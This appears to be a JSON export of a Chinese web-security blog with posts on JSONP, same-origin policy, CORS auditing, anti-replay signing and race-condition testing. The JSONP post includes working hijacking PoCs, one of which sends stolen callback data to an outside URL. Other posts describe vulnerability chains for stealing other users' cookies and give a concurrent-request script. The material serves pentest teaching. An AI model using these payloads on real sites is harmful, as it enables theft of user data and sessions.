{"meta":{"title":"VK's blog","subtitle":"VK's blog","description":null,"author":"VK","url":"http://www.vkxss.top","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2019-09-25T08:45:31.231Z","updated":"2019-09-25T08:45:31.231Z","comments":false,"path":"/404.html","permalink":"http://www.vkxss.top//404.html","excerpt":"","text":""},{"title":"关于","date":"2019-10-10T09:29:30.628Z","updated":"2019-10-10T09:29:30.628Z","comments":false,"path":"about/index.html","permalink":"http://www.vkxss.top/about/index.html","excerpt":"","text":"生如蝼蚁，当立鸿鹄之志。命如薄纸，却有不屈之心。乾坤未定，你我皆是黑马。祝你我飞黄腾达前程似锦。"},{"title":"分类","date":"2019-09-08T06:03:31.259Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"categories/index.html","permalink":"http://www.vkxss.top/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2019-12-03T08:39:25.871Z","updated":"2019-12-03T08:39:25.871Z","comments":true,"path":"links/index.html","permalink":"http://www.vkxss.top/links/index.html","excerpt":"","text":"www.syst1m.com"},{"title":"Repositories","date":"2019-09-08T06:06:03.124Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"repository/index.html","permalink":"http://www.vkxss.top/repository/index.html","excerpt":"","text":""},{"title":"书单","date":"2019-09-08T07:27:54.732Z","updated":"2019-09-08T07:27:54.732Z","comments":false,"path":"books/index.html","permalink":"http://www.vkxss.top/books/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-09-08T06:03:31.300Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"tags/index.html","permalink":"http://www.vkxss.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"前端安全之跨域安全（上）","slug":"前端安全-前端安全之跨域安全（上）","date":"2020-02-08T16:20:14.934Z","updated":"2020-02-08T16:20:22.064Z","comments":true,"path":"2020/02/09/前端安全-前端安全之跨域安全（上）/","link":"","permalink":"http://www.vkxss.top/2020/02/09/前端安全-前端安全之跨域安全（上）/","excerpt":"","text":"0x01 什么是JSONP JSONP(JSON with Padding) 是 json 的一种”使用模式”，其主要是为了解决跨域读取数据的问题，JSONP本质上是利用了script标签的跨域能力，和json本身没有关系。 0x02 如何使用JSONP跨域 例如a.com 想要跨域读取b.com某个接口的返回内容，则（1）需要在 a.com 上包含如下前端代码示例： 1234567&lt;script&gt; //jsonp回调方法，一定要写在jsonp请求前面 function jsonp_callback(msg)&#123; do something();//回调函数，自定义读取数据后续操作 &#125;&lt;/script&gt;&lt;script src =&quot;http://b.com/getinfo?callback=jsonp_callback&quot; type=&quot;text/javascript&quot; &gt;&lt;/script&gt; （2）b.com的服务端针对/callback接口可进行如下设置（以java代码为例）： 12345@RequestMapping(value=&quot;/getinfo&quot;,method=RequestMethod.GET)@ResponseBodypublic String testdemo(@RequestParam(&quot;callback&quot;) String callbackFunction)&#123; return callbackFunction+&quot;&#123;\\&quot;result\\&quot;:&#123;\\&quot;data\\&quot;:&#123;\\&quot;_csrf_token\\&quot;:\\&quot;18623163885dedec5decbab1.37745340\\&quot;&#125;&#125;&#125;;&quot;;&#125; - **注意：只支持GET方法** - 上面演示的是我们自定义的callback函数下的跨域方法，一般在企业开发实践中经常需要我们自定义callback函数，当然也可以用默认的callback。0x03 JSONP 开发实践中的安全问题1、未正确设置Content-Type 而导致的反射型XSS 例如按照上面的跨域方式，a.com跨域请求b.com网站，http://b.com/getinfo?callback=jsonp_callback ，同时b.com返回如下json报文： jsonp_callback({&quot;result&quot;:{&quot;status&quot;:{&quot;code&quot;:11,&quot;msg&quot;:&quot;缺少参数:吧id或吧名称&quot;},&quot;data&quot;:{&quot;_csrf_token&quot;:&quot;18623163885dedec5decbab1.37745340&quot;}}}); 若b.com 返回头中设置的Content-Type值为如下所示 Content-Type: text/html; charset=UTF-8 则攻击者可以构造如下链接从而执行xss: http://b.com/getinfo?callback=alert(1) 2、JSONP劫持 JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的 在有些网站开发中，尤其是同域名下的不同子域之间，通过jsonp方式传输敏感信息，例如用户信息、token之类的，就要关注JSONP劫持问题了。因此可以通过下列代码先读取返回的信息然后修改或者发送到攻击者指定的服务器。 12345678&lt;script&gt; //jsonp回调方法，一定要写在jsonp请求前面 function jsonp_callback(msg)&#123; alert(msg);//如果能正确弹框显示取到的_csrf_token值则表明存在劫持漏洞 do_evilSomething();//发送敏感数据 &#125;&lt;/script&gt;&lt;script src =&quot;http://b.com/getinfo?callback=jsonp_callback&quot; type=&quot;text/javascript&quot; &gt;&lt;/script&gt; 也就是攻击者可以精心构造一个包含上述代码的钓鱼页面，如果用户此前正好登录过b.com网站，这样只需要受害者访问该钓鱼页面，jsonp就会携带受害者用户在b.com上的cookie信息发起此次跨域请求，因而通过函数回调就可以读取返回的内容，劫持受害者用户的敏感信息，最后将这些信息发送给攻击者。 附攻击POC 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;JSONP劫持测试&lt;/title&gt;&lt;body&gt;&lt;script&gt; function test1(data)&#123; alert(JSON.stringify(data)); &#125;&lt;/script&gt; &lt;script src=&quot;http://test.vkbiu.com/auth/user/list?currentpage=1&amp;pagesize=10&amp;callback=test1&amp;_=1570675244823&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 附空Referer绕过POC 12345678910&lt;html&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&lt;script&gt; function test(data)&#123; alert(data.name); &#125;&lt;/script&gt;&lt;script src=http://localhost:8080/jsonp/emptyReferer?callback=test&gt;&lt;/script&gt;&lt;/html&gt; 附攻击EXP 12345678910&lt;script&gt;function test1(data)&#123; alert(JSON.stringify(data)); var xmlhttp = new XMLHttpRequest(); var url = &quot;http://127.0.0.1/&quot; + JSON.stringify(data); xmlhttp.open(&quot;GET&quot;,url,true); xmlhttp.send(); &#125;&lt;/script&gt;&lt;script src=&quot;http://test.vkbiu.com/user/qualification/list?page=1&amp;pagesize=100&amp;callback=test1&quot;&gt;&lt;/script&gt;","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://www.vkxss.top/categories/前端安全/"}],"tags":[{"name":"前端知识","slug":"前端知识","permalink":"http://www.vkxss.top/tags/前端知识/"}]},{"title":"理解同源策略总结","slug":"前端安全-理解同源策略总结","date":"2020-02-08T15:56:43.798Z","updated":"2020-02-08T15:56:43.798Z","comments":true,"path":"2020/02/08/前端安全-理解同源策略总结/","link":"","permalink":"http://www.vkxss.top/2020/02/08/前端安全-理解同源策略总结/","excerpt":"","text":"0x01 背景 0x02 首先说说为什么存在同源策略 0x03 举个例子 0x04 同源策略的限制范围 0x05 允许跨域加载的三个标签 0x06 绕过跨域 0x07 sop无法防御csrf 0x08 SOP 与 ajax 0x01 背景 当我们可能观察到了不少网站的一些接口信息。发现浏览器为了保证用户隐私以及其它因素考虑，对于网络接口的调用有一层屏障，这层屏障称为同源策略。那么今天我们就来学习下这个同源策略，希望能提升大家对于接口的测试和利用水平。 0x02 首先说说为什么存在同源策略 我们知道JavaScript可以操作html，可以发出请求，也可以用iframe加载别的网站。那么试想一下，你登陆了一个购物网站比如某宝，接着去访问了VK’Blog。如果VK’Blog利用JavaScript给某宝的收货地址url发起了请求，从原则上讲，这个请求不会成功，否则你的隐私就泄露了。那么控制这个请求的成功与否，就叫同源策略。 总之，同源策略的规定可以概括成：不同域的客户端脚本在没明确授权的情况下，不能读写对方的资源。 0x03 举个例子 假设有以下页面，比较 A 页面与其它页面是否同源～ 12345A：http://vk.com/a.html B：http://vk.com/b.html C：https://vk.com /c.html D：http://test.vk.com/d.html E：http://vk.com:8081/e.html 根据定义，可以知道 A 和 B 同源，而 A 和 C、D、E 不同源。A、B 页面同源是因为其协议（都是 http）、域名（都是 xys.ttsy）和端口（都是 80）都相同；而 A 与 C、D、E 不同源，是因为 A 和 C 不同协议（http 和 https），A 和 D 不同域名（vk.com 和 test.vk.com），A 和 E 不同端口（80 和 8081） 。 注意 同源策略要求三同, 即: 同域, 同协议, 同端口. 同域即host相同, 顶级域名, 一级域名, 二级域名, 三级域名等必须相同, 且域名不能与 ip 对应; 顶级域名：.cn 一级域名：vk.cn 二级域名：www.vk.cn 三级域名：xxx.www.vk.cn 同协议要求, http与https协议必须保持一致; 同端口要求, 端口号必须相同. IE有些例外, 它仅仅只是验证主机名以及访问协议，而忽略了端口号. 这里需要澄清一个概念, 所谓的域, 跟 js 等资源的存放服务器没有关系, 比如你到 baidu.com 使用 script 标签请求了 google.com 下的js, 那么该 js 所在域是 baidu.com, 而不是 google.com. 换言之, 它能操作baidu.com的页面对象, 却不能操作google.com的页面对象. 0x04 同源策略的限制范围 同源策略下的web世界, 域的壁垒高筑, 从而保证各个网页相互独立, 互相之间不能直接访问, iframe, ajax 等均受其限制, 但是有三个标签是允许跨域加载资源的。 Iframe限制 可以访问同域资源, 可读写; 访问跨域页面时, 只读. Ajax限制 Ajax 的限制比 iframe 限制更严. 同域资源可读写; 跨域请求会直接被浏览器拦截.(chrome下跨域请求不会发起, 其他浏览器一般是可发送跨域请求, 但响应被浏览器拦截) Cookie限制 只有同源的网页才能共享 但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置document.domain共享 Cookie。 举例来说，A网页是http://w1.example.com/a.html，B网页是http://w2.example.com/b.html，那么只要设置相同的document.domain，两个网页就可以共享Cookie。 document.domain = ‘example.com’;现在，A网页通过脚本设置一个 Cookie。document.cookie = “test1=hello”; B网页就可以读到这个 Cookie。var allCookie = document.cookie; 注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB 无法通过这种方法，规避同源政策，而要使用下文介绍的PostMessage API。 另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如.example.com。 Set-Cookie: key=value; domain=.example.com; path=/ 这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。 所以Cookie中的同源只关注域名，忽略协议和端口。所以https://localhost:8080/和http://localhost:8081/的Cookie是共享的。 LocalStorage、IndexDB等存储性内容 DOM节点 0x05 允许跨域加载的三个标签123&lt;img src=&quot;&quot; /&gt;&lt;link href=&quot;&quot; /&gt;&lt;script src=&quot;&quot;&gt;&lt;/script&gt; script并无跨域限制, 这是因为script标签引入的文件不能够被客户端的 js 获取到, 不会影响到原页面的安全, 因此script标签引入的文件没必要遵循浏览器的同源策略. 相反, ajax 加载的文件内容可被客户端 js 获取到, 引入的文件内容可能会泄漏或者影响原页面安全, 故, ajax必须遵循同源策略. 0x06 绕过跨域 SOP 带来安全，同时也会带来一定程度的麻烦，因为有时候就是有跨域的需求。绕过跨域的方案由于篇幅所限，并且网上也很多相关文章，所以不在这里展开解决跨域的方案，只给出几个关键词： 对于 ajax 使用 JSONP jsonp是将请求通过动态创建一个“script”标签的方式来将请求发送出去的，所以不是XMLhttpRequest请求，浏览器就不会进行拦截校验。 AJAX的使用与平常无异，只需要将dataType改为jsonp即可 12345678910var result; $.ajax(&#123; url: &apos;http://restapi.amap.com/v3/direction/driving?origin=116.45925,39.910031&amp;destination=116.587922,40.081577&amp;output=json&amp;key=5f5b33e5a55685fac26237601cd58a49&apos;, dataType: &quot;jsonp&quot;, jsonp: &quot;callback&quot;, //与服务端约定的函数名cache:true, //是否需要缓存，如果这里没有配置缓存，那么请求的URL还会有一个参数 success: function(json)&#123; result = json; &#125; &#125;); 服务端接收到以后，只需要手动判断一下有无callback再手动拼一对括号即可,这里以java为例 1234567891011@ResponseBody@RequestMapping(value=&quot;xxx&quot;)public String testJsonp(String callback) &#123; Student result = new Student(); //响应结果之前，判断是否为jsonp请求 if (StringUtils.isNotBlank(callback)) &#123; //把结果封装成一个js语句响应 return callback + &quot;(&quot; + JsonUtils.objectToJson(result) + &quot;);&quot;; &#125; return JsonUtils.objectToJson(result);&#125; 后端进行 CORS 配置 后端反向代理 使用代理方式跨域更加直接，因为SOP的限制是浏览器实现的。如果请求不是从浏览器发起的，就不存在跨域问题了。 使用本方法跨域步骤如下： 把访问其它域的请求替换为本域的请求 本域的请求是服务器端的动态脚本负责转发实际的请求 首先在 conf\\apiserver-reverse-proxy-conf\\bingli\\main.conf ，没有相关目录和文件就新建 123456location ~* ^/uc/.*&#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://192.168.10.111:8080;&#125; 然后在nginx主配置文件添加加粗内容，即把代理文件加载进来 12345location / &#123; root html; index index.html index.htm; &#125;include apiserver-reverse-proxy-conf/bingli/main.conf; 123456重启nginx，之后ajax发请求到http://localhost/uc/aahttp://localhost/uc/bb?token=xxxx都会被转发到http://192.168.10.111:8080/uc/aahttp://192.168.10.111:8080/uc/bb?token=xxxx 对于 iframe 使用 location.hash 或 window.name 进行信息交流 使用 postMessage 0x07 sop无法防御csrf 我们通过原理就可以发现。CSRF是指 A 网站正常登陆后，cookie 正常保存，用户访问攻击者网站 B ，通过某种方式调用 A 网站接口进行操作，A 的接口在请求时会自动带上 cookie，来完成攻击。 SOP 首先就是“禁止跨域请求”，这样描述也不是很合法。本质上 SOP 并不是禁止跨域请求，而是在请求后拦截了请求的回应。 发现，SOP 不阻止接口请求而是拦截请求结果。 而CSRF 恰恰占了这两个便宜，所以 SOP 不能作为防范 CSRF 的方法。 0x08 SOP 与 ajax 对于 ajax 请求，在获得数据之后你能肆意进行 js 操作。这时候虽然同源策略会阻止响应，但依然会发出请求。因为执行响应拦截的是浏览器而不是后端程序。事实上你的请求已经发到服务器并返回了结果，但是迫于安全策略，浏览器不允许你继续进行 js 操作，所以报出你熟悉的 blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource.。 所以再强调一次，同源策略不能作为防范 CSRF 的方法。 跨域是浏览器限制","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://www.vkxss.top/categories/前端安全/"}],"tags":[{"name":"前端知识","slug":"前端知识","permalink":"http://www.vkxss.top/tags/前端知识/"}]},{"title":"Java代码审计-CORS","slug":"代码审计-Java-CORS","date":"2020-02-05T06:15:29.558Z","updated":"2020-02-08T16:20:27.608Z","comments":true,"path":"2020/02/05/代码审计-Java-CORS/","link":"","permalink":"http://www.vkxss.top/2020/02/05/代码审计-Java-CORS/","excerpt":"","text":"0x01、 问题背景公司的项目需要前后端分离，vue+java，这时候就需要支持Cors跨域请求了.0x001 什么是Cors?CORS 全称是跨域资源共享（Cross-Origin Resource Sharing），是一种 AJAX 跨域请求资源的方式，支持现代浏览器，IE支持10以上。 CORS与JSONP的使用目的相同，但是比JSONP更强大。JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。 简单来说Cors就是用来解决跨域问题的。此外解决的方式还有：Nginx反向代理，Jsoup等方式。不过Nginx不符合Devops理念，不易维护，而Jsoup支持的请求类型只支持Get请求。Cors更为适合；0x002 什么是跨域？同源就是指：域名，协议，端口 均相同 跨域就是指： 域名，协议，端口 其中至少有一个是不同的； 当前端请求后端接口的时候，当端口号，ip地址等不一致的时候，为了安全性考量，请求所响应的数据不会被前端展示。等于请求的数据没有被标识为友军，没有被证明是敌是友； ajax请求才会出现跨域0x003 Cors能解决什么问题？通过在服务端配置Cors相关的东西，能识别是否给予跨域权限，然后给予能跨域的标识，通过此标识，浏览器就可以渲染返回来的数据啦~~0x02案例一. Cors在SpringCloud微服务中的使用；0x001 环境：JDK1.8 IDEA SpringCloud微服务 网关使用Zuul0x002 代码：1234567891011121314151617181920212223242526272829package com.leyou.gateway.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.cors.CorsConfiguration;import org.springframework.web.cors.UrlBasedCorsConfigurationSource;import org.springframework.web.filter.CorsFilter;@Configurationpublic class CorsConfiguration &#123; @Bean public CorsFilter corsFilter()&#123; //配置初始化对象 CorsConfiguration configuration=new CorsConfiguration(); //允许跨域的域名，如果要携带cookie，不能写* 。 *：代表所有的域名都可以访问 configuration.addAllowedOrigin(&quot;http://localhost:9001&quot;); configuration.setAllowCredentials(true); configuration.addAllowedMethod(&quot;*&quot;); //代表所有的请求方法 configuration.addAllowedHeader(&quot;*&quot;); //允许携带任何头信息 //初始化cors配置源对象 UrlBasedCorsConfigurationSource configurationSource=new UrlBasedCorsConfigurationSource(); configurationSource.registerCorsConfiguration(&quot;/**&quot;,configuration); //返回corsFilter实例，参数:cors配置源对象 return new CorsFilter(configurationSource); &#125;&#125; 0x003 什么是zuul微服务网关： https://www.jianshu.com/p/29e9c91e3f3e https://www.jianshu.com/p/7bc06a64519b 0x03 【HTTP header】【【Access-Control-Allow-Credentials】跨域Ajax请求时是否带Cookie的设置 前端发起AJAX请求都会受到同源策略（CORS）的限制。发起AJAX请求的方法： 1234第一个是原生方法 XMLHttpRequest第二个是jQuery封装的 JQuery的$.ajax第三个是fetch是专门封装的库 Fetch第四个是axios 前端在发起AJAX请求时，同域或者直接访问的情况下，因为没有跨域的需求，所以Request的Header中的Origin为空。此时，如果后端代码是response.setHeader(“Access-Control-Allow-Origin”, origin)，那么Response的header中不会出现Access-Control-Allow-Origin，因为Origin为空。 注意当我们的客户端和服务端交互的时候使用的是 token，通过 Authorization头发送到服务端，并没有使用到 cookie时，所以客户端没有必要设置 withCredentials: true 0x001 无Cookie跨域Ajax请求 客户端 123456789- 以 jQuery 的 ajax 为例：$.ajax(&#123; url : &apos;http://remote.domain.com/corsrequest&apos;, data : data, dataType: &apos;json&apos;, type : &apos;POST&apos;, crossDomain: true, contentType: &quot;application/json&quot;, // POST时必须 主要注意的是参数 crossDomain: true。发送Ajax时，Request header 中会包含跨域的额外信息，但不会含cookie。 服务器端 跨域的允许主要由服务器端控制。服务器端通过在响应的 header 中设置 Access-Control-Allow-Origin 及相关一系列参数，提供跨域访问的允许策略。 1234567891011以Java为例：/*** Spring Controller中的方法：*/ @RequestMapping(value = &quot;/corsrequest&quot;) @ResponseBody public Map&lt;String, Object&gt; mainHeaderInfo(HttpServletResponse response) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); ... &#125; 通过在响应 header 中设置 星号 来允许来自所有域的跨域请求访问。 1response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); 只允许来自特定域 http://my.domain.cn:8080 的跨域访问 1response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;http://my.domain.cn:8080&quot;); 较灵活的设置方式，允许所有包含 mydomain.com 的域名访问.从安全的角度去考虑，并不建议使用，因为攻击者很容易绕过。 12if(request.getHeader(&quot;Origin&quot;).contains(&quot;mydomain.com&quot;)) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, request.getHeader(&quot;Origin&quot;)); 0x002 带Cookie的跨域Ajax请求 客户端 1234567891011$.ajax(&#123; url : &apos;http://remote.domain.com/corsrequest&apos;, data : data, dataType: &apos;json&apos;, type : &apos;POST&apos;, xhrFields: &#123; withCredentials: true &#125;, crossDomain: true, contentType: &quot;application/json&quot;, 通过设置 withCredentials: true ，发送Ajax时，Request header中便会带上 Cookie 信息。 服务器端 相应的，对于客户端的参数，服务器端也需要进行设置： 123456789* Spring Controller中的方法： @RequestMapping(value = &quot;/corsrequest&quot;) @ResponseBody public Map&lt;String, Object&gt; getUserBaseInfo(HttpServletResponse response) &#123; if(request.getHeader(&quot;Origin&quot;).contains(&quot;woego.cn&quot;)) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, request.getHeader(&quot;Origin&quot;)); &#125; response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); ... 对应客户端的 xhrFields.withCredentials: true 参数，服务器端通过在响应 header 中设置 Access-Control-Allow-Credentials = true 来运行客户端携带证书式访问。通过对 Credentials 参数的设置，就可以保持跨域 Ajax 时的 Cookie。这里需要注意的是： 12服务器端 Access-Control-Allow-Credentials = true时，参数Access-Control-Allow-Origin 的值不能为 &apos;*&apos; 。 0x04 Nginx导致Cors及修复方案 存在漏洞配置： 123456789add_header Access-Control-Allow-Origin *;add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;;oradd_header &apos;Access-Control-Allow-Origin&apos; &quot;$http_origin&quot;;add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;; 修复方案需要限制origin： 12add_header &apos;Access-Control-Allow-Origin&apos; https://test.joychou.org;add_header &apos;Access-Control-Allow-Origin&apos; http://test.joychou.org;","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"java通过sign签名+时间戳的方式防止rest接口被恶意抓包调用和重放（转）","slug":"APP-验签名与重放","date":"2020-01-16T08:10:57.352Z","updated":"2020-01-19T07:37:14.458Z","comments":true,"path":"2020/01/16/APP-验签名与重放/","link":"","permalink":"http://www.vkxss.top/2020/01/16/APP-验签名与重放/","excerpt":"","text":"java通过sign签名+时间戳的方式防止rest接口被恶意抓包调用和重放 要避免接口被恶意利用，我们可以在网关连接器进行验签的操作，也就是sign。但是攻击者还可以重放数据包，那具体应该要怎么做呢？下面我提供3个方法，供大家参考。同时再此记录下，方便翻阅。 https://blog.csdn.net/u014270696/article/details/97372584 方法1：请求接口的参数中添加时间戳 具体实现原理：每次客户端发送请求时，获取当前时间戳，当参数一同发送到服务器，服务器拦截该请求，获取服务器上当前时间戳和客户端请求中的时间戳进行比较，如果两个时间戳相差超过60s的话就认定为非法请求，因为一般一次正常的http请求发送到服务器不会超过60秒，所以可以这样做。 这样可以做到简单的防重放，但是并不能 真的解决重放的问题，时间戳如果被修改为当前时间戳的话。那这种方式就失效了。 这时候就需要另外一种方式了 方法2：请求接口的参数中添加sign签名 具体实现原理：使用签名验证，保证每次请求时候签名只能使用一次。 客户端和服务器端约定一个生成签名串的算法，可以由客户端ip+加密密钥+当前时间戳进行MD5加密生成，前端生成签名串后，跟随参数一起发送到后台解密，并将该签名串保存在redis中，下次请求的时候，先在redis中取查找是否有该签名串，如果有，则说明是非正常请求，这时候就可以认定为非法操作。 但是这样也会存在一个问题，也就是随着时间的推移，redis中会保存越来越多的这样的sign签名，对于服务器资源消耗是一笔不小的开销，这时候需要是我们去清理了，当然我们可以选择给每个sign设定一个过期时间，让他自动清理，比如说设置1天的有效时长，这样当天就不能使用这个sign来请求了，但是一天后还是可以继续使用。这样也有隐患。这时候可以结合时间戳验证和sign签名验证。 方法3：请求接口的参数中添加sign签名+时间戳（推荐） 具体实现原理：客户端生成MD5加密签名串，和当前时间戳跟随请求的参数一起发送到后台，后台获取签名进行解密，然后保存到redis中并设置一个失效时长（60s），则60s内不能使用相同的sign发送请求，然后获取系统当前时间戳和前端发送过来的时间戳做比较，如果两者相差超过60s，则认定为非法操作。 这种方式既能保证防止请求重放，又能有效节省服务器资源，推荐使用。 Java 代码层","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APP渗透测试","slug":"APP渗透测试","permalink":"http://www.vkxss.top/tags/APP渗透测试/"}]},{"title":"漏洞挖掘的组合拳","slug":"渗透测试-漏洞挖掘的组合拳","date":"2019-11-15T07:30:08.000Z","updated":"2020-01-09T09:25:59.973Z","comments":true,"path":"2019/11/15/渗透测试-漏洞挖掘的组合拳/","link":"","permalink":"http://www.vkxss.top/2019/11/15/渗透测试-漏洞挖掘的组合拳/","excerpt":"","text":"漏洞挖掘的组合拳案例一 URL跳转+CSRF漏洞 条件：校验referer值、存在URL跳转漏洞、存在CSRF漏洞 当网站校验Referer值，无CSRG_token,的时候。我们配合URL跳转完成攻击。来提升漏洞危害性 案例二 SELF-XSS+CSRF漏洞 条件：存在CSRF漏洞 可以利用csrf写入型篡改他人信息。例如利用csrf做个钓鱼界面，来修改他人的信息，比如修改备注名、邮箱、手机号。有的业务需要二次验证。当我们修改用户手机号或邮箱后。导致用户无法登陆。来提升漏洞危害性。 案例三 SELF-XSS+越权漏洞 条件：通过篡改ID，可以越权。 当我们的xss只能自己触发的时候，他会有点鸡肋，所以配合越权获取其他人的cookie。我们越权修改他人信息后，触发代码。我们收到的cookie信息就是其他人的啦。来提升漏洞危害性。 案例四 URL跳转+DOMXSS 我们在测试的时候总会遇到类似returnurl这样的参数，后边的值是跳转的地址，当开发没有做白名单的时候，我们就实现任意URL跳转，或者有的触发条件是需要用户登陆后进行跳转的。但我们有时候会疏忽另一个测试点，就是DOM型XSS：“JavaScript：alert（/xss/）//”。开发同样没有对用户输入的字符进行过滤。 案例五 文件上传+条件竞争=RCE 现在大部分厂商都喜欢把业务中上传的图片，存储在云上。有遮样一个案例，当把上传的图片先传到服务器，服务器再传到云上，这样就可以利用条件竞争进行RCE攻击。 案例六 目录遍历+文件上传=RCE 案例七 文件上传+文件名XSS https://cloud.tencent.com/developer/article/1165636 案例八 文件上传+文件内容XSS https://xz.aliyun.com/t/6362 案例九 文件上传+文件名注入 http://kfbiji.com/article/d7e00b56df31a053 案例十 文件上传+文件内容注入 https://paper.seebug.org/256/#sql-ii 案例十一 Self-XSS+CSRF=Reflected-XSS -例如在评论、登录、文件上传等处的Self-XSS，结合CSRF可变为反射型XSS。 未完结。。。。。。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Python多线程测试并发漏洞测试","slug":"Python-多线程测试并发漏洞测试","date":"2019-11-13T07:30:08.000Z","updated":"2019-11-15T09:10:27.215Z","comments":true,"path":"2019/11/13/Python-多线程测试并发漏洞测试/","link":"","permalink":"http://www.vkxss.top/2019/11/13/Python-多线程测试并发漏洞测试/","excerpt":"","text":"Python多线程测试并发漏洞测试 步骤记录 Python多线程测试并发漏洞测试 我们在使用黑盒，例如测试一些支付、兑换类的功能时，都需要进行多线程并发测试，来确保测试的应用在代码或者数据库层是否加锁。 步骤记录 Burp Suite安装插件，方便生成python发包代码 拦截包并生成代码,并打开一个文本编辑器，右键粘贴出来： 运行Python多线程代码 将生成的python代码粘贴到action()函数里面即可； 12345678910111213141516171819202122import threadingimport requeststhreads = []def action(): burp0_url = &quot;https://www.baidu.com:443/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=1&quot; burp0_cookies = &#123;&quot;BAIDUID&quot;: &quot;E316F3DB8A100CF49C7840194D685130:FG=1&quot;, &quot;BIDUPSID&quot;: &quot;E316F3DB8A100CF4365A4179630696D4&quot;, &quot;PSTM&quot;: &quot;1571902876&quot;, &quot;BD_UPN&quot;: &quot;133252&quot;, &quot;H_PS_PSSID&quot;: &quot;1434_21105_29568_29220_22160&quot;, &quot;BDORZ&quot;: &quot;B490B5EBF6F3CD402E515D22BCDA1598&quot;, &quot;delPer&quot;: &quot;0&quot;, &quot;BD_CK_SAM&quot;: &quot;1&quot;, &quot;PSINO&quot;: &quot;2&quot;, &quot;BD_HOME&quot;: &quot;0&quot;, &quot;H_PS_645EC&quot;: &quot;6d50bLk7EAzhqdJENzPoKrR6B%2FRN9gavPDwdfFeqclmRNgzaMlT7KBxZaRg&quot;, &quot;COOKIE_SESSION&quot;: &quot;292444_5_6_2_4_26_0_2_2_5_0_0_243247_0_0_0_1573179527_1572936381_1573657905%7C6%23221_3_1572936369%7C2&quot;, &quot;BDSVRTM&quot;: &quot;130&quot;&#125; burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125; res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies) # print(res.status_code)if __name__ == &apos;__main__&apos;: print(&quot;threading start!&quot;) for i in range(50): t = threading.Thread(target=action) t.start() print(&quot;threading end!&quot;) 确认结果即可","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"条件竞争漏洞总结","slug":"渗透测试-条件竞争漏洞总结","date":"2019-11-12T07:30:08.000Z","updated":"2019-11-13T15:35:02.401Z","comments":true,"path":"2019/11/12/渗透测试-条件竞争漏洞总结/","link":"","permalink":"http://www.vkxss.top/2019/11/12/渗透测试-条件竞争漏洞总结/","excerpt":"","text":"0x00 条件竞争漏洞介绍 0x01 漏洞挖掘 0x02 测试流程 0x03 漏洞案例 0x04 测试技巧 使用Burp模块-Inturder 修复建议 漏洞防御 0x00 条件竞争漏洞介绍 